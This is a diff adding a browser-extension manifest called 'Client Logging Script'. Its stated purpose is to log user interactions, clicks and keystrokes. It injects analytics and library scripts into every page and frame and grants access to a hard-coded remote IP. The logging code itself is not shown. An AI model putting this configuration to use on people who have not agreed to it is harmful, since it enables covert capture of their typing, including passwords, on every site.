@@ -1,0 +1,25 @@
+{
+  "name": "Client Logging Script",
+  "version": "1.0",
+  "description": "Log user intraction, mouse click, keystrokes and ... ",
+  "browser_action": {
+    "default_icon": "browser_action_icon.png",
+    "popup": "popup.html"
+  },
+  "icons": {
+    "48": "icon.png"
+  },
+  "background_page" : "background.html",
+  "permissions": [
+	 "tabs",
+    "http://129.78.24.121/"
+  ],
+  "content_scripts": [
+    {
+      "matches": ["*://*/*"],
+	  "js": ["js/jquery-1.6.1.js","js/jquery-ui-1.8.13.custom.min.js","js/pnotify/jquery.pnotify.min.js","js/jquery.jixedbar/src/jquery.jixedbar.min.js","js/yui/build/yahoo/yahoo-min.js","js/yui/build/event/event-min.js","js/yui/build/connection/connection-min.js","js/yui/build/yahoo-dom-event/yahoo-dom-event.js","js/yui/build/element/element-min.js","js/yui/build/button/button-min.js","js/yui/build/container/container-min.js","js/yui/build/animation/animation-min.js","js/yui/build/dragdrop/dragdrop-min.js","js/yui/build/json/json-min.js","js/yui/build/progressbar/progressbar-min.js","js/yui/build/layout/layout-min.js","js/yui/build/resize/resize-min.js","js/yui/build/dragdrop/dragdrop-min.js","js/analytics.js"],
+      "run_at": "document_end",
+      "all_frames": true
+    }
+  ]
+}
